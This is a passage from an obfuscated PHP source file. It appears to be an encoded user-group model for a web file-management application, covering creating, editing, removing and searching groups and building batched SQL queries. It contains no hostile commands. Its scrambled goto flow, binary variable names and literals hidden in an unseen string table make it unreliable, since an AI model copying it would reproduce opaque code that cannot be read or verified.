Model($d†Èëå™Ğ˜[1420])->get($dóˆÌˆ¥¡, $aŒ†Š®—Òé); if (is_null($eÒñ ÓÖâš)) { Model($d†Èëå™Ğ˜[1420])->set($d†Èëå™Ğ˜[1391], 10, $aŒ†Š®—Òé); Model($d†Èëå™Ğ˜[1420])->set($d†Èëå™Ğ˜[673], $d†Èëå™Ğ˜[83], $aŒ†Š®—Òé); Model($d†Èëå™Ğ˜[1420])->set($d†Èëå™Ğ˜[1386], $d†Èëå™Ğ˜[470], $aŒ†Š®—Òé); $eÒñ ÓÖâš = Model($d†Èëå™Ğ˜[1420])->get($dóˆÌˆ¥¡, $aŒ†Š®—Òé); } return $eÒñ ÓÖâš; } private static function valueSet($fÚ±ä‡“äÜ, $FÇ¡Í’§íº) { $eŒà™ãÒõ‡ =& $_SERVER[“]; return Model($eŒà™ãÒõ‡[1420])->set($fÚ±ä‡“äÜ, $FÇ¡Í’§íº, $eŒà™ãÒõ‡[1419]); } protected static function log($AØØŒÔ) { write_log($AØØŒÔ, $_SERVER[“][1421]); } private static function cacheClear() { $e’ˆëËÀ»› =& $_SERVER[“]; $c©¬çŞ‘‘‘ = Model($e’ˆëËÀ»›[1420])->cacheKey($e’ˆëËÀ»›[1419]); Cache::clearMemory($c©¬çŞ‘‘‘); Model($e’ˆëËÀ»›[1393])->cacheClear(); } } $bÂ¼›´İöÃ = LIB_DIR . $_SERVER[“][772]; goto bšÃï¡Â±; DÍ›ëóä¶: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\164\141\142\154\x65\116\141\x6d\x65" => "\147\x72\157\x75\160\137\155\145\x74\141", "\155\x65\x74\x61\x46\151\x65\x6c\144" => "\147\x72\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($báÚ¡İ¾‰ë) { $aÛ±”Ö×» =& $_SERVER[“]; return array($aÛ±”Ö×»[2164] => array($báÚ¡İ¾‰ë[0], $aÛ±”Ö×»[2165]), $aÛ±”Ö×»[2166] => array($báÚ¡İ¾‰ë[0], $aÛ±”Ö×»[2165])); } protected function getInfo($C÷Ï¯´Î) { $D±å¡˜“Øô = $this->getInfoSimple($C÷Ï¯´Î); if (!$D±å¡˜“Øô) { return !1; } return $this->_listDataApplyItem($D±å¡˜“Øô); } protected function getInfoSimple($FÛïô£Ó†ó, $dÛ‡××âáÚ = false) { $cïâÇÉÇœ© =& $_SERVER[“]; if ($dÛ‡××âáÚ) { $AöÓÍ‘é‰é = array($cïâÇÉÇœ©[2095] => intval($FÛïô£Ó†ó)); $D¨ƒÃ¶ˆã = $this->where($AöÓÍ‘é‰é)->find(); return is_array($D¨ƒÃ¶ˆã) ? $D¨ƒÃ¶ˆã : array(); } return $this->cacheFunctionGet($cïâÇÉÇœ©[2167], $FÛïô£Ó†ó); } protected function groupAdd($EÁİïâõÄ¦) { goto F®Ş°©‡‚; DÕÎ¥¹¼ËÂ: if (!empty($EÁİïâõÄ¦[$BåÇšÈÏø[2095]])) { $aã…ğà’ªß[$BåÇšÈÏø[2095]] = $EÁİïâõÄ¦[$BåÇšÈÏø[2095]]; } $D³ÕĞ‰œª¼ = $this->add($aã…ğà’ªß); $this->setNamePinyin($D³ÕĞ‰œª¼, $aã…ğà’ªß[$BåÇšÈÏø[28]]); goto D‡ÜŠâÁ”; c¼™à§õÅŸ: if ($cŞ·íÔŒÎ[$BåÇšÈÏø[461]]) { $BÙÁ¬òĞ— = $cŞ·íÔŒÎ[$BåÇšÈÏø[461]] . $cŞ·íÔŒÎ[$BåÇšÈÏø[2095]] . $BåÇšÈÏø[47]; } $aã…ğà’ªß = array($BåÇšÈÏø[386] => $this->groupNameAuto($EÁİïâõÄ¦[$BåÇšÈÏø[463]], $EÁİïâõÄ¦[$BåÇšÈÏø[28]]), $BåÇšÈÏø[368] => $EÁİïâõÄ¦[$BåÇšÈÏø[463]], $BåÇšÈÏø[527] => $BÙÁ¬òĞ—, $BåÇšÈÏø[2168] => $EÁİïâõÄ¦[$BåÇšÈÏø[2079]], $BåÇšÈÏø[2169] => 0, $BåÇšÈÏø[2099] => 0); if (isset($EÁİïâõÄ¦[$BåÇšÈÏø[2116]])) { $aã…ğà’ªß[$BåÇšÈÏø[2116]] = $EÁİïâõÄ¦[$BåÇšÈÏø[2116]]; } else { $BÎçóÆõ‰Û = $this->max($BåÇšÈÏø[2116]); if (!$BÎçóÆõ‰Û) { $BÎçóÆõ‰Û = 0; } $aã…ğà’ªß[$BåÇšÈÏø[2116]] = $BÎçóÆõ‰Û + 1; } goto DÕÎ¥¹¼ËÂ; D‡ÜŠâÁ”: if (isset($EÁİïâõÄ¦[$BåÇšÈÏø[2170]])) { $this->metaSet($D³ÕĞ‰œª¼, array($BåÇšÈÏø[2170] => $EÁİïâõÄ¦[$BåÇšÈÏø[2170]], $BåÇšÈÏø[2171] => $EÁİïâõÄ¦[$BåÇšÈÏø[2171]])); unset($EÁİïâõÄ¦[$BåÇšÈÏø[2170]]); unset($EÁİïâõÄ¦[$BåÇšÈÏø[2171]]); } Model($BåÇšÈÏø[1104])->groupRootAdd($D³ÕĞ‰œª¼); return $D³ÕĞ‰œª¼; goto c‚¤ïŸ‰À; F®Ş°©‡‚: $BåÇšÈÏø =& $_SERVER[“]; if (!$EÁİïâõÄ¦[$BåÇšÈÏø[463]] && isset($EÁİïâõÄ¦[$BåÇšÈÏø[2095]]) && $EÁİïâõÄ¦[$BåÇšÈÏø[2095]] == 1) { if ($cŞ·íÔŒÎ = $this->getInfoSimple($EÁİïâõÄ¦[$BåÇšÈÏø[2095]], !0)) { return $EÁİïâõÄ¦[$BåÇšÈÏø[2095]]; } } else { $cŞ·íÔŒÎ = $this->getInfoSimple($EÁİïâõÄ¦[$BåÇšÈÏø[463]]); if (!$cŞ·íÔŒÎ) { return !1; } } $BÙÁ¬òĞ— = $BåÇšÈÏø[472]; goto c¼™à§õÅŸ; c‚¤ïŸ‰À: } protected function groupEdit($Fî™ââ§š, $FŒáØøŠ) { $E¶èá®¸™” =& $_SERVER[“]; if (!empty($FŒáØøŠ[$E¶èá®¸™”[463]])) { $b±†×»È‹È = $this->getInfoSimple($Fî™ââ§š); $fË‰ñğ°Æ¾ = $this->getInfoSimple($FŒáØøŠ[$E¶èá®¸™”[463]]); if (!$b±†×»È‹È || !$fË‰ñğ°Æ¾) { return !1; } if ($b±†×»È‹È[$E¶èá®¸™”[2095]] == $fË‰ñğ°Æ¾[$E¶èá®¸™”[2095]]) { return !1; } if ($FŒáØøŠ[$E¶èá®¸™”[463]] != $b±†×»È‹È[$E¶èá®¸™”[463]]) { if ($fË‰ñğ°Æ¾[$E¶èá®¸™”[461]] !== $b±†×»È‹È[$E¶èá®¸™”[461]] && strpos($fË‰ñğ°Æ¾[$E¶èá®¸™”[461]], $b±†×»È‹È[$E¶èá®¸™”[461]] . $b±†×»È‹È[$E¶èá®¸™”[2095]] . $E¶èá®¸™”[47]) === 0) { return !1; } $FŒáØøŠ[$E¶èá®¸™”[527]] = $fË‰ñğ°Æ¾[$E¶èá®¸™”[461]] . $FŒáØøŠ[$E¶èá®¸™”[463]] . $E¶èá®¸™”[47]; $this->_changeChildLevel($b±†×»È‹È, $fË‰ñğ°Æ¾); } } if (isset($FŒáØøŠ[$E¶èá®¸™”[28]])) { $this->setNamePinyin($Fî™ââ§š, $FŒáØøŠ[$E¶èá®¸™”[28]]); } if (isset($FŒáØøŠ[$E¶èá®¸™”[2170]])) { $this->metaSet($Fî™ââ§š, array($E¶èá®¸™”[2170] => $FŒáØøŠ[$E¶èá®¸™”[2170]], $E¶èá®¸™”[2171] => $FŒáØøŠ[$E¶èá®¸™”[2171]])); unset($FŒáØøŠ[$E¶èá®¸™”[2170]]); unset($FŒáØøŠ[$E¶èá®¸™”[2171]]); } return $this->where(array($E¶èá®¸™”[2172] => $Fî™ââ§š))->save($FŒáØøŠ); } private function _changeChildLevel($C·ßî¯øÉœ, $d…‰–½‰÷Á, $b†„Ì¡‚¾É = false) { goto d¶…µ¬¼´â; bÇ²¹ŒåÈÉ: $this->where($eäÑĞØìŞ)->data($e§ÓÌã¥ìÙ)->save(); goto Få…İöŠ”î; E³¾¬Ö»öô: if ($b†„Ì¡‚¾É) { $Aíé¾¹Ô¹á = $d…‰–½‰÷Á[$AÎİ´íÈ¶¼[461]] . $d…‰–½‰÷Á[$AÎİ´íÈ¶¼[2095]] . $AÎİ´íÈ¶¼[47]; } $eäÑĞØìŞ = array($AÎİ´íÈ¶¼[527] => array($AÎİ´íÈ¶¼[485], $C·ßî¯øÉœ[$AÎİ´íÈ¶¼[461]] . $C·ßî¯øÉœ[$AÎİ´íÈ¶¼[2095]] . $AÎİ´íÈ¶¼[486])); $e§ÓÌã¥ìÙ = array($AÎİ´íÈ¶¼[527] => array($AÎİ´íÈ¶¼[536], "\162\145\x70\154\141\143\145\x28\160\x61\162\145\x6e\x74\x4c\145\166\x65\x6c\54\47{$d˜ôï£’Õ‡}\x27\54\x27{$Aíé¾¹Ô¹á}\47\51")); goto bÇ²¹ŒåÈÉ; d¶…µ¬¼´â: $AÎİ´íÈ¶¼ =& $_SERVER[“]; $d˜ôï£’Õ‡ = $C·ßî¯øÉœ[$AÎİ´íÈ¶¼[461]] . $C·ßî¯øÉœ[$AÎİ´íÈ¶¼[2095]] . $AÎİ´íÈ¶¼[47]; $Aíé¾¹Ô¹á = $d…‰–½‰÷Á[$AÎİ´íÈ¶¼[461]] . $d…‰–½‰÷Á[$AÎİ´íÈ¶¼[2095]] . $AÎİ´íÈ¶¼[47] . $C·ßî¯øÉœ[$AÎİ´íÈ¶¼[2095]] . $AÎİ´íÈ¶¼[47]; goto E³¾¬Ö»öô; Få…İöŠ”î: } public function setNamePinyin($Bòï‡…ì”, $eÅâŠ±©Ü‡ = false) { $a°õÊ¯Ò±µ =& $_SERVER[“]; if (!$eÅâŠ±©Ü‡) { $D£ø±ÏµÔÒ = $this->getInfoSimple($Bòï‡…ì”); $eÅâŠ±©Ü‡ = $D£ø±ÏµÔÒ[$a°õÊ¯Ò±µ[28]]; } if (!Input::check($eÅâŠ±©Ü‡, $a°õÊ¯Ò±µ[530])) { $this->metaSet($Bòï‡…ì”, $a°õÊ¯Ò±µ[416], null); $this->metaSet($Bòï‡…ì”, $a°õÊ¯Ò±µ[415], null); return; } $eŸåõÖÜ³ˆ = array($a°õÊ¯Ò±µ[416] => str_replace($a°õÊ¯Ò±µ[50], $a°õÊ¯Ò±µ[33], Pinyin::encode($eÅâŠ±©Ü‡)), $a°õÊ¯Ò±µ[415] => Pinyin::encode($eÅâŠ±©Ü‡, $a°õÊ¯Ò±µ[531])); $this->metaSet($Bòï‡…ì”, $eŸåõÖÜ³ˆ); } protected function groupStatus($Dò‘‰‰ÓÉİ, $eÜù¯Õá) { goto DïŠòóôæó; cöÑ÷ìòÑÖ: if ($eÜù¯Õá == $E¶—ò¨Öè½[83]) { $C°Áò ƒñ = $this->parentLevelArray($cé –—­Ğ–[$E¶—ò¨Öè½[461]]); } else { $B’¼‹Îª×’ = array($E¶—ò¨Öè½[527] => array($E¶—ò¨Öè½[485], $cé –—­Ğ–[$E¶—ò¨Öè½[461]] . $cé –—­Ğ–[$E¶—ò¨Öè½[2095]] . $E¶—ò¨Öè½[486])); $C°Áò ƒñ = $this->where($B’¼‹Îª×’)->field($E¶—ò¨Öè½[2095])->select(); $C°Áò ƒñ = array_to_keyvalue($C°Áò ƒñ, $E¶—ò¨Öè½[33], $E¶—ò¨Öè½[2095]); } $C°Áò ƒñ[] = $cé –—­Ğ–[$E¶—ò¨Öè½[2095]]; $dÓé¼áÃ­™ = array(); goto FÊÅÙ³Œ¹‚; DïŠòóôæó: $E¶—ò¨Öè½ =& $_SERVER[“]; $cé –—­Ğ– = $this->getInfoSimple($Dò‘‰‰ÓÉİ); if (!$cé –—­Ğ–) { return !1; } goto cöÑ÷ìòÑÖ; FÊÅÙ³Œ¹‚: foreach ($C°Áò ƒñ as $Dò‘‰‰ÓÉİ) { $dÓé¼áÃ­™[] = array($E¶—ò¨Öè½[2095] => $Dò‘‰‰ÓÉİ, $E¶—ò¨Öè½[89] => $E¶—ò¨Öè½[673], $E¶—ò¨Öè½[359] => $eÜù¯Õá); } return Model($E¶—ò¨Öè½[2173])->addAll($dÓé¼áÃ­™, array(), !0); goto eäŞŒƒ¼è; eäŞŒƒ¼è: } protected function groupRemove($cæÀñ¥öáÕ) { goto c¶ˆ ºÌá; c¶ˆ ºÌá: $A ×¾ØŠâ =& $_SERVER[“]; $d°¥Ş£Øø… = array($A ×¾ØŠâ[2095] => $cæÀñ¥öáÕ); $bêºÖí”Ä† = $this->where($d°¥Ş£Øø…)->find(); goto déÂˆ ’; déÂˆ ’: if (!$bêºÖí”Ä† || $bêºÖí”Ä†[$A ×¾ØŠâ[463]] == 0) { return !1; } $cÖ‹³Æà¦ = $this->getInfoSimple($bêºÖí”Ä†[$A ×¾ØŠâ[463]]); $this->_changeChildLevel($bêºÖí”Ä†, $cÖ‹³Æà¦, !0); goto D„ºêØ„²Ò; F§ æÉËØ: Model($A ×¾ØŠâ[736])->groupRootRemove($cæÀñ¥öáÕ); return $this->where($d°¥Ş£Øø…)->delete(); goto F×–Üùåğ; D„ºêØ„²Ò: $this->where(array($A ×¾ØŠâ[463] => $cæÀñ¥öáÕ))->save(array($A ×¾ØŠâ[463] => $bêºÖí”Ä†[$A ×¾ØŠâ[463]])); Model($A ×¾ØŠâ[2173])->where($d°¥Ş£Øø…)->delete(); Model($A ×¾ØŠâ[2174])->where($d°¥Ş£Øø…)->delete(); goto F§ æÉËØ; F×–Üùåğ: } protected function groupSort($c¾Ø”ôä ) { $dâ¥…ƒ›” =& $_SERVER[“]; $díªùˆÇˆµ = array(); foreach ($c¾Ø”ôä  as $D¤ÔğõÓ† => $eœÛ¦Øä²¸) { $díªùˆÇˆµ[] = array($dâ¥…ƒ›”[2095], $eœÛ¦Øä²¸, $dâ¥…ƒ›”[2116], $D¤ÔğõÓ† + 1); } $this->saveAll($díªùˆÇˆµ); } public function listData() { $B‡Ñ–²®á = $this->_makeOrder()->selectPage(50); $this->_listDataApply($B‡Ñ–²®á[$_SERVER[“][354]]); return $B‡Ñ–²®á; } private function _makeOrder($AÃçÃÉÑ¡ = '') { goto cÕ‘å¾äëå; cÕ‘å¾äëå: $E­ÚÎ¨º×´ =& $_SERVER[“]; $a‘™¢Ô¤Ã‡ = array($E­ÚÎ¨º×´[2095], $E­ÚÎ¨º×´[28], $E­ÚÎ¨º×´[2081], $E­ÚÎ¨º×´[187]); $E¤§µÁ¹…İ = array($E­ÚÎ¨º×´[402] => $E­ÚÎ¨º×´[403], $E­ÚÎ¨º×´[404] => $E­ÚÎ¨º×´[405]); goto d³„‚×—; A‰ÁØŠœ¥: $AÃçÃÉÑ¡ = $AÃçÃÉÑ¡ . "{$Dªå¤™Ò„}\40{$a£†‹Ş¹‘ }\x2c\x20\x67\x72\x6f\165\x70\x49\104\40\141\x73\x63"; return $this->order($AÃçÃÉÑ¡); goto a´İÆªÂØ; d³„‚×—: $Dªå¤™Ò„ = Input::get($E­ÚÎ¨º×´[407], $E­ÚÎ¨º×´[7], $E­ÚÎ¨º×´[2099], $a‘™¢Ô¤Ã‡); $a£†‹Ş¹‘  = Input::get($E­ÚÎ¨º×´[408], $E­ÚÎ¨º×´[7], $E­ÚÎ¨º×´[2175], array($E­ÚÎ¨º×´[2175], $E­ÚÎ¨º×´[404])); $a£†‹Ş¹‘  = $E¤§µÁ¹…İ[$a£†‹Ş¹‘ ]; goto A‰ÁØŠœ¥; a´İÆªÂØ: } public function listChild($AïÔµ‰Ùº„) { $BÄÀ°°äµß =& $_SERVER[“]; $C®–Æ½æ— = $this->where(array($BÄÀ°°äµß[463] => $AïÔµ‰Ùº„))->_makeOrder()->selectPage(200); $this->_listDataApply($C®–Æ½æ—[$BÄÀ°°äµß[354]]); return $C®–Æ½æ—; } public function listByID($aÍøÅÊÉøÎ) { $C‹«¶Í­Áä =& $_SERVER[“]; if (!$aÍøÅÊÉøÎ) { return array(); } $b¹÷È¯Ñ›Û = array($C‹«¶Í­Áä[2095] => array($C‹«¶Í­Áä[7], $aÍøÅÊÉøÎ)); $c²‡Ú‡Û¬ = $this->where($b¹÷È¯Ñ›Û)->select(); $this->_listDataApply($c²‡Ú‡Û¬); return $c²‡Ú‡Û¬; } public function listSearch($fÚ†ˆÜ¹ÇÕ) { goto f£ğƒ•ÔÚ‘; DÆÍ¸ÄĞ´: if ($C´¶Âİ¾İ‚) { $f¥“°±Õ‡ = $this->getInfoSimple($C´¶Âİ¾İ‚); $DİÖÜ¥ˆÍ = $f¥“°±Õ‡[$CÚ¾¢‚­—[461]] . $C´¶Âİ¾İ‚ . $CÚ¾¢‚­—[486]; $EÛôêâß¢ = array($EÛôêâß¢, array($CÚ¾¢‚­—[461] => array($CÚ¾¢‚­—[735], $DİÖÜ¥ˆÍ))); } $b„Œ—¶òÜ = $this->_makeOrder()->where($EÛôêâß¢)->selectPage(20); $b„Œ—¶òÜ = $b„Œ—¶òÜ ? $b„Œ—¶òÜ : array(); goto b«‹Û‹ÇËÓ; b«‹Û‹ÇËÓ: if (!$b„Œ—¶òÜ || count($b„Œ—¶òÜ[$CÚ¾¢‚­—[354]]) < 5 && Input::check($bã¶İñ×·î, $CÚ¾¢‚­—[306])) { goto a¢Çñæ ë‡; a¢Çñæ ë‡: $FÎƒÃŸš‰§ = $this->groupChildrenAll($C´¶Âİ¾İ‚); $E©äÔ¥Ûº¨ = $this->_searchFromMeta($CÚ¾¢‚­—[415], $bã¶İñ×·î, 10, $FÎƒÃŸš‰§); $câ•÷öÕ“Á = $this->_searchFromMeta($CÚ¾¢‚­—[416], $bã¶İñ×·î, 10, $FÎƒÃŸš‰§); goto B„¿ñŠß¥; aª ´œõö†: $b„Œ—¶òÜ[$CÚ¾¢‚­—[351]][$CÚ¾¢‚­—[353]] = ceil($b„Œ—¶òÜ[$CÚ¾¢‚­—[351]][$CÚ¾¢‚­—[352]] / $b„Œ—¶òÜ[$CÚ¾¢‚­—[351]][$CÚ¾¢‚­—[349]]); goto b÷×óëë; B„¿ñŠß¥: $bùôÅ±Ö = array_merge($E©äÔ¥Ûº¨, $câ•÷öÕ“Á, $b„Œ—¶òÜ[$CÚ¾¢‚­—[354]]); $b„Œ—¶òÜ[$CÚ¾¢‚­—[354]] = array_unique_by_key($bùôÅ±Ö, $CÚ¾¢‚­—[2095]); $b„Œ—¶òÜ[$CÚ¾¢‚­—[351]][$CÚ¾¢‚­—[352]] = count($b„Œ—¶òÜ[$CÚ¾¢‚­—[354]]); goto aª ´œõö†; b÷×óëë: } $this->_listDataApply($b„Œ—¶òÜ[$CÚ¾¢‚­—[354]]); return $b„Œ—¶òÜ; goto d¾‹è×º†â; DÒ˜ªØ“†³: if (!trim($bã¶İñ×·î)) { return !1; } $bã¶İñ×·î = str_replace($CÚ¾¢‚­—[2178], $CÚ¾¢‚­—[2179], $bã¶İñ×·î); $EÛôêâß¢ = array($CÚ¾¢‚­—[2095] => array($CÚ¾¢‚­—[735], "\45{$bã¶İñ×·î}\x25"), $CÚ¾¢‚­—[28] => array($CÚ¾¢‚­—[735], "\45{$bã¶İñ×·î}\x25"), $CÚ¾¢‚­—[900] => $CÚ¾¢‚­—[2180]); goto DÆÍ¸ÄĞ´; f£ğƒ•ÔÚ‘: $CÚ¾¢‚­— =& $_SERVER[“]; $bã¶İñ×·î = $fÚ†ˆÜ¹ÇÕ[$CÚ¾¢‚­—[2176]]; $C´¶Âİ¾İ‚ = isset($fÚ†ˆÜ¹ÇÕ[$CÚ¾¢‚­—[2177]]) ? $fÚ†ˆÜ¹ÇÕ[$CÚ¾¢‚­—[2177]] : !1; goto DÒ˜ªØ“†³; d¾‹è×º†â: } protected function groupChildrenAll($fãíĞæÁğ) { $Fñó×¯•¿Ô =& $_SERVER[“]; if (!$fãíĞæÁğ) { return !1; } if (is_string($fãíĞæÁğ)) { $fãíĞæÁğ = array($fãíĞæÁğ); } $D“ŒÌ‹Û‹œ = $fãíĞæÁğ; foreach ($fãíĞæÁğ as $E¾±…¼ß‡¬) { $fÚ©¨˜Œö¢ = $this->getInfoSimple($E¾±…¼ß‡¬); $f©¿­ù•õÒ = array($Fñó×¯•¿Ô[461] => array($Fñó×¯•¿Ô[735], $fÚ©¨˜Œö¢[$Fñó×¯•¿Ô[461]] . $E¾±…¼ß‡¬ . $Fñó×¯•¿Ô[486])); $D†¼£°éâ† = $this->field($Fñó×¯•¿Ô[2095])->where($f©¿­ù•õÒ)->select(); $D“ŒÌ‹Û‹œ = array_merge($D“ŒÌ‹Û‹œ, array_to_keyvalue($D†¼£°éâ†, $Fñó×¯•¿Ô[33], $Fñó×¯•¿Ô[2095])); } return array_unique($D“ŒÌ‹Û‹œ); } private function _searchFromMeta($f‹Ñ¢¦‚¦À, $eŒˆ”‰ğƒİ, $A¬ø÷‹ùÃ, $B…ŒÏá¯Ç¯) { goto Eœ…­ƒåØ‰; Eœ…­ƒåØ‰: $c–­İøÏ‹ =& $_SERVER[“]; $eŒˆ”‰ğƒİ = strtolower($eŒˆ”‰ğƒİ); $FÅã©‰ØÊ® = array($c–­İøÏ‹[89] => $f‹Ñ¢¦‚¦À, $c–­İøÏ‹[359] => array($c–­İøÏ‹[735], "\45{$eŒˆ”‰ğƒİ}\x25")); goto A ˆàÈì¢¤; A ˆàÈì¢¤: if ($B…ŒÏá¯Ç¯) { $FÅã©‰ØÊ®[$c–­İøÏ‹[2095]] = array($c–­İøÏ‹[7], $B…ŒÏá¯Ç¯); } $dñÂ¬áõß– = Model($c–­İøÏ‹[2181])->where($FÅã©‰ØÊ®)->limit($A¬ø÷‹ùÃ)->select(); if (!$dñÂ¬áõß–) { return array(); } goto BÓÆõ¸ù©à; BÓÆõ¸ù©à: $dñÂ¬áõß– = array_to_keyvalue($dñÂ¬áõß–, $c–­İøÏ‹[33], $c–­İøÏ‹[2095]); $d²É©¼ øÕ = $this->where(array($c–­İøÏ‹[2172] => array($c–­İøÏ‹[7], $dñÂ¬áõß–)))->select(); if (!$d²É©¼ øÕ) { return array(); } goto A½³Ø‡; A½³Ø‡: return $d²É©¼ øÕ; goto C“Í„¶ò; C“Í„¶ò: } protected function _listDataApplyItem($DÇ¦°†ÖÆ) { $Bù¹ƒ ²­à = array($DÇ¦°†ÖÆ); $this->_listDataApply($Bù¹ƒ ²­à); return $Bù¹ƒ ²­à[0]; } protected function _listDataApply(&$fÊ¥‘Æ§á‡) { goto A©¬µ‘à·¯; f×À¬ÃÎà: $this->_listAppendParent($fÊ¥‘Æ§á‡); $this->_listAppendSourceRoot($fÊ¥‘Æ§á‡, $aÄ¦Àó»¶Õ); goto bíÕ…ˆÕ¸Í; A©¬µ‘à·¯: $f£—ÌÛ·‘ =& $_SERVER[“]; if (!$fÊ¥‘Æ§á‡) { return; } $aÄ¦Àó»¶Õ = array_to_keyvalue($fÊ¥‘Æ§á‡, $f£—ÌÛ·‘[33], $f£—ÌÛ·‘[2095]); goto C‘‹—³Ÿ³; C‘‹—³Ÿ³: $this->_listAppendChildren($fÊ¥‘Æ§á‡); $this->_listAppendChildrenMember($fÊ¥‘Æ§á‡); $this->_listAppendMeta($fÊ¥‘Æ§á‡, $aÄ¦Àó»¶Õ); goto f×À¬ÃÎà; bíÕ…ˆÕ¸Í: } private function _listAppendChildren(&$F¸¸×¿Äç†) { goto DÍ½ãñ†§Å; F‰Ôƒøªí: $aã¤¡“Ş ‚ = array_to_keyvalue($aã¤¡“Ş ‚, $f¹ĞªØîâ[452]); foreach ($F¸¸×¿Äç† as &$BõÄİ”£Ïã) { $BõÄİ”£Ïã[$f¹ĞªØîâ[2182]] = isset($aã¤¡“Ş ‚[$BõÄİ”£Ïã[$f¹ĞªØîâ[2095]] . $f¹ĞªØîâ[2183]]); } goto eŒÎĞöô; Bêí÷´óà: $BºÆ–¡‡ˆé = count($F¸¸×¿Äç†); $bò²ë÷¶¥ñ = $this->tablePrefix . $this->tableName; for ($c¦ÂÌ¯‚Á‰ = 0, $d¦‘ºË«Ö = 0; $c¦ÂÌ¯‚Á‰ < $BºÆ–¡‡ˆé; $c¦ÂÌ¯‚Á‰++) { $d¦‘ºË«Ö++; $fæ£©º±‚Á = $F¸¸×¿Äç†[$c¦ÂÌ¯‚Á‰][$f¹ĞªØîâ[2095]]; $f½Àæëô´ï .= "\x53\x45\x4c\x45\x43\124\x20\x2a\x20\x46\122\117\x4d\x20\50\x53\105\114\x45\103\x54\40\x27{$fæ£©º±‚Á}\137\x63\x68\x69\154\x64\47\x20\x61\x73\x20\x68\x61\163\40\106\x52\x4f\115\x20\x60{$bò²ë÷¶¥ñ}\140\40\167\x68\145\162\145\40\x70\141\162\x65\156\164\111\x44\x3d{$fæ£©º±‚Á}\40\x6c\x69\155\x69\x74\x20\61\x29\40\x61\163\x20\164\x62\x5f{$fæ£©º±‚Á}\x20\165\156\x69\157\x6e\40\141\154\154\40"; if (($d¦‘ºË«Ö >= 20 || $c¦ÂÌ¯‚Á‰ == $BºÆ–¡‡ˆé - 1) && $f½Àæëô´ï) { $f½Àæëô´ï = substr($f½Àæëô´ï, 0, -strlen($f¹ĞªØîâ[451])); $A„ĞÀÈäÛç = $this->query($f½Àæëô´ï); $aã¤¡“Ş ‚ = array_merge($aã¤¡“Ş ‚, $A„ĞÀÈäÛç); $d¦‘ºË«Ö = 0; $f½Àæëô´ï = $f¹ĞªØîâ[33]; } } goto F‰Ôƒøªí; DÍ½ãñ†§Å: $f¹ĞªØîâ =& $_SERVER[“]; $f½Àæëô´ï = $f¹ĞªØîâ[361]; $aã¤¡“Ş ‚ = array(); goto Bêí÷´óà; eŒÎĞöô: } private function _listAppendChildrenMember(&$CØœ »à–) { goto f«‰âˆß£; eâçÇ™™ëè: $e˜‹£ƒæ™à = array_to_keyvalue($e˜‹£ƒæ™à, $DÔ»‰‰ğ¨¥[452]); foreach ($CØœ »à– as &$cŒÈÑ­çğà) { $cŒÈÑ­çğà[$DÔ»‰‰ğ¨¥[2184]] = isset($e˜‹£ƒæ™à[$cŒÈÑ­çğà[$DÔ»‰‰ğ¨¥[2095]] . $DÔ»‰‰ğ¨¥[2183]]); } goto cÈˆŠİ¼ÉÑ; A÷–È¦Ï—: $fÙ§¿Í³­» = count($CØœ »à–); $D‘¤×ä¼¯Ş = $this->tablePrefix . $DÔ»‰‰ğ¨¥[2174]; for ($C¤ãã á = 0, $c¡™¯İëš³ = 0; $C¤ãã á < $fÙ§¿Í³­»; $C¤ãã á++) { $c¡™¯İëš³++; $D¤ôğ•ö­ = $CØœ »à–[$C¤ãã á][$DÔ»‰‰ğ¨¥[2095]]; $AÅŠŸÛ‡Ğ± .= "\x53\105\x4c\105\x43\x54\40\52\x20\x46\x52\x4f\x4d\x20\50\x53\105\114\x45\x43\124\40\x27{$D¤ôğ•ö­}\x5f\x63\150\x69\x6c\x64\47\40\141\163\40\150\141\x73\40\x46\122\117\x4d\x20\x60{$D‘¤×ä¼¯Ş}\x60\40\167\x68\145\162\x65\x20\x67\x72\x6f\x75\x70\x49\104\x3d{$D¤ôğ•ö­}\40\154\x69\155\x69\164\x20\x31\x29\x20\141\163\x20\164\142\x5f{$D¤ôğ•ö­}\40\x75\156\x69\x6f\x6e\x20\141\154\x6c\40"; if (($c¡™¯İëš³ >= 20 || $C¤ãã á == $fÙ§¿Í³­» - 1) && $AÅŠŸÛ‡Ğ±) { $AÅŠŸÛ‡Ğ± = substr($AÅŠŸÛ‡Ğ±, 0, -strlen($DÔ»‰‰ğ¨¥[451])); $câÛ¿“¤Ø = $this->query($AÅŠŸÛ‡Ğ±); $e˜‹£ƒæ™à = array_merge($e˜‹£ƒæ™à, $câÛ¿“¤Ø); $c¡™¯İëš³ = 0; $AÅŠŸÛ‡Ğ± = $DÔ»‰‰ğ¨¥[33]; } } goto eâçÇ™™ëè; f«‰âˆß£: $DÔ»‰‰ğ¨¥ =& $_SERVER[“]; $AÅŠŸÛ‡Ğ± = $DÔ»‰‰ğ¨¥[361]; $e˜‹£ƒæ™à = array(); goto A÷–È¦Ï—; cÈˆŠİ¼ÉÑ: } private function _listAppendMeta(&$d½š¡âî«â, $E¦×ÒŸº) { $A“ªÄÃœ·¦ =& $_SERVER[“]; $DÊãö„œ× = array($A“ªÄÃœ·¦[2095] => array($A“ªÄÃœ·¦[7], $E¦×ÒŸº)); $eÉéõƒºÉÔ = Model($A“ªÄÃœ·¦[2173])->where($DÊãö„œ×)->select(); $eÉéõƒºÉÔ = array_to_keyvalue_group($eÉéõƒºÉÔ, $A“ªÄÃœ·¦[2095]); foreach ($eÉéõƒºÉÔ as &$BĞÓÔæ©½‚) { $BĞÓÔæ©½‚ = array_to_keyvalue($BĞÓÔæ©½‚, $A“ªÄÃœ·¦[89], $A“ªÄÃœ·¦[359]); } foreach ($d½š¡âî«â as &$CÛà¶èÔŠ©) { $CÛà¶èÔŠ©[$A“ªÄÃœ·¦[417]] = array(); if (isset($eÉéõƒºÉÔ[$CÛà¶èÔŠ©[$A“ªÄÃœ·¦[2095]]])) { $CÛà¶èÔŠ©[$A“ªÄÃœ·¦[417]] = $eÉéõƒºÉÔ[$CÛà¶èÔŠ©[$A“ªÄÃœ·¦[2095]]]; } } } protected function parentLevelArray($eòƒæÁÂÙ¨) { $fó…µİİ‡ =& $_SERVER[“]; $eòƒæÁÂÙ¨ = explode($fó…µİİ‡[47], trim($eòƒæÁÂÙ¨, $fó…µİİ‡[47])); $eòƒæÁÂÙ¨ = array_remove_value($eòƒæÁÂÙ¨, $fó…µİİ‡[470]); return $eòƒæÁÂÙ¨; } private function _listAppendParent(&$AØóÒïã×) { goto Dö©î°©™Ò; 